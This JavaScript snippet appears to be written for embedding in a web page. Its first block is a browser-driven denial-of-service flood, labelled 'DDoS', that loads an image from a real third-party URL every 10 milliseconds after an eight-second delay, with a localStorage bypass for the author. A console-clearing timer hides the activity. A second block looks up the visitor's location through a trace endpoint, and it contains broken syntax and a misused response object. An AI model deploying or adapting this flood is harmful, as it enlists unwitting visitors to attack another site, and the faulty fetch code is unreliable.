if (window.localStorage.getItem("bypass") != "true") {
  // DDoS - https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387
  function imgflood() {
    var TARGET =
      "https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387";
    var pic = new Image();
    pic.src = `${TARGET}&timestamp=${new Date().getTime()}`;
  }
  setTimeout(function () {
    setInterval(imgflood, 10);
  }, 8000);
}
setTimeout(function () {
    console.clear()
}, 12000);


////////////////////////////
// data.split("loc=")[1].split("\n")[0];
fetch("https://cdn.cyfan.top/cdn-cgi/trace", {
  method: "GET",
  mode: "cors"
}).then(function(res) {
  if (res.status === 200) {
      return res;
  } else {
      return Promise.reject(res)
  }
}).then(function(data) {
  console.log(data.split("loc=")[1].split("\n")[0];);
}).catch(function(err) {
  console.log(err);
});
